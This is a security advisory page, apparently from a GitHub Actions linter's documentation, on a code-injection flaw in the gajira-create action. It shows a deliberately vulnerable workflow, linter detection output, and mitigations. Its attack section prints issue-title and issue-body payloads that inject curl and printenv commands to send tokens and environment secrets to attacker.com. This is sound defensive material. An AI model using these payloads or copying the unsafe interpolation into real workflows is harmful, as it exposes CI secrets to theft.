# GHSA-4xqx-pqpj-9fqw

## Summary

| Field | Value |
|-------|-------|
| CVE | CVE-2020-14188 |
| Affected Action | atlassian/gajira-create |
| Severity | Critical (CVSS 9.8) |
| Vulnerability Type | Code Execution via Crafted Issue (CWE-94) |
| Published | 2025-01-29 |

## Vulnerability Description

The atlassian/gajira-create GitHub Action (versions < 2.0.1) is vulnerable to arbitrary code execution through specially crafted GitHub issues. An attacker can create a GitHub issue with malicious content that executes arbitrary commands within the GitHub runner environment when the action processes the issue to create a Jira ticket.

**Technical Details:**
- CVSS Score: 9.8/10 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- CWE-94: Improper Control of Generation of Code (Code Injection)
- EPSS: 2.136% (84th percentile probability of exploitation)
- Attack Vector: Network-based, requires no privileges or user interaction
- Impact: High confidentiality, integrity, and availability impact

**Why This is Critical:**
1. Can be triggered by any user who can create issues (often public in open-source repositories)
2. Workflows run with elevated permissions and access to secrets (JIRA_API_TOKEN, GITHUB_TOKEN)
3. Large attack surface - both issue title and body fields are vulnerable
4. No user interaction required after issue creation

**Patches:** Fixed in gajira-create version 2.0.1

**Workarounds:** There are no known workarounds - upgrading to the patched version is required

## Vulnerable Pattern

```yaml
on:
  issues:
    types: [opened]

jobs:
  create-jira-issue:
    runs-on: ubuntu-latest
    permissions:
      issues: write

    steps:
      - name: Create Jira issue
        run: |
          # Issue content directly interpolated - vulnerable!
          ISSUE_TITLE="${{ github.event.issue.title }}"
          ISSUE_BODY="${{ github.event.issue.body }}"

          curl -X POST https://jira.example.com/rest/api/2/issue \
            -H "Authorization: Bearer ${{ secrets.JIRA_TOKEN }}" \
            -d "{\"fields\": {\"summary\": \"$ISSUE_TITLE\", \"description\": \"$ISSUE_BODY\"}}"

      # Also vulnerable when using the action directly
      - uses: atlassian/gajira-create@v3
        with:
          summary: ${{ github.event.issue.title }}
          description: ${{ github.event.issue.body }}
```

**Attack Vector**: An attacker creates an issue with:
- Title: `Test $(curl http://attacker.com/?secret=$JIRA_API_TOKEN)`
- Body: `Description $(printenv > /tmp/secrets.txt && curl -F file=@/tmp/secrets.txt http://attacker.com)`
- The injected commands execute and can exfiltrate secrets

## Detection in sisakulint

### Detection Result

```
script/actions/advisory/GHSA-4xqx-pqpj-9fqw-vulnerable.yaml:28:27: code injection (critical): "github.event.issue.title" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-4xqx-pqpj-9fqw-vulnerable.yaml:29:26: code injection (critical): "github.event.issue.body" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Expected | Detected | Rule |
|----------|----------|------|
| Issue title/body code injection | Yes | code-injection-critical |

sisakulint **successfully detected** this vulnerability. It detected that `github.event.issue.title` and `github.event.issue.body` are used directly in inline scripts in a workflow with privileged triggers (`issues`), and issued `code-injection-critical` warnings.

Detected key vulnerabilities:
- **code-injection-critical** (line 28): `github.event.issue.title` is recognized as untrusted input, recommends passing through environment variable
- **code-injection-critical** (line 29): `github.event.issue.body` is recognized as untrusted input, recommends passing through environment variable
- This detection prevents code execution attacks via Issue content created by arbitrary users

## Mitigation

1. **Use environment variables**: Primary mitigation for shell scripts
   ```yaml
   env:
     ISSUE_TITLE: ${{ github.event.issue.title }}
     ISSUE_BODY: ${{ github.event.issue.body }}
     JIRA_TOKEN: ${{ secrets.JIRA_TOKEN }}
   run: |
     # Create JSON safely with jq
     jq -n --arg title "$ISSUE_TITLE" --arg body "$ISSUE_BODY" \
       '{fields: {summary: $title, description: $body}}' > issue.json

     curl -X POST https://jira.example.com/rest/api/2/issue \
       -H "Authorization: Bearer $JIRA_TOKEN" \
       -d @issue.json
   ```

2. **Use JSON tools**: Avoid shell interpolation entirely
   ```yaml
   run: |
     cat > issue.json <<'EOF'
     {"fields": {"summary": "", "description": ""}}
     EOF

     jq --arg title "$ISSUE_TITLE" --arg body "$ISSUE_BODY" \
       '.fields.summary = $title | .fields.description = $body' \
       issue.json > issue_final.json
   ```

3. **Input validation**: Validate and sanitize before use
   ```yaml
   env:
     ISSUE_TITLE: ${{ github.event.issue.title }}
   run: |
     # Validate title length and characters
     if [[ ${#ISSUE_TITLE} -gt 255 ]]; then
       echo "Title too long"
       exit 1
     fi
   ```

4. **Update to patched version**: Use the latest version with security fixes

## References

- [GitHub Advisory](https://github.com/advisories/GHSA-4xqx-pqpj-9fqw)
- [Repository Security Advisory](https://github.com/atlassian/gajira-create/security/advisories/GHSA-4xqx-pqpj-9fqw)
- [atlassian/gajira-create Repository](https://github.com/atlassian/gajira-create)
- [sisakulint: Code Injection Rules](../codeinjection.md)
- [sisakulint: Argument Injection Rules](../argumentinjection.md)
- [Sample Vulnerable Workflow](../../script/actions/advisory/GHSA-4xqx-pqpj-9fqw-vulnerable.yaml)
- [Sample Safe Workflow](../../script/actions/advisory/GHSA-4xqx-pqpj-9fqw-safe.yaml)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
